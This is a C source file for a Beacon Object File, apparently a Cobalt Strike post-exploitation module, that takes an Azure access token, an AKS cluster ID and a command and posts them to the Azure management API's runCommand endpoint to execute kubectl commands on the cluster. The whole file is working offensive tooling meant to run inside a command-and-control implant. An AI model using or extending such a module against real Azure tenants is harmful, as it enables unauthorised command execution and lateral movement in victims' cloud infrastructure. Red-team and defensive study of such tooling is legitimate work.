/*
 * invoke_azurerm_aks_run_command.c — BARK BOF
 * Invoke-AzureRMAKSRunCommand — Run a kubectl command on an AKS cluster
 *
 * Args : token, aksClusterId, command
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

void go(char *args, int alen)
{
    datap  parser;
    static char pathBuf[1024];
    static char bodyBuf[4096];
    LPWSTR widePath = NULL;
    char  *token = NULL, *aksId = NULL, *command = NULL;

    BeaconDataParse(&parser, args, alen);
    token   = BeaconDataExtract(&parser, NULL);
    aksId   = BeaconDataExtract(&parser, NULL);
    command = BeaconDataExtract(&parser, NULL);

    if (!token || MSVCRT$strlen(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Usage: bark_invoke_azurerm_aks_run_command "
            "<token> <aksClusterId> <command>\n");
        return;
    }
    MSVCRT$sprintf_s(bodyBuf, sizeof(bodyBuf),
        "{\"command\":\"%s\",\"context\":\"\"}", command);
    MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
        "%s/runCommand?api-version=2022-01-01", aksId);
    widePath = MbsToWcs(pathBuf);
    if (!widePath) { BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n"); return; }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Invoke-AzureRMAKSRunCommand\n");
    BarkPost(L"management.azure.com", widePath, L"POST", bodyBuf, token, "application/json");
    HFree(widePath);
}
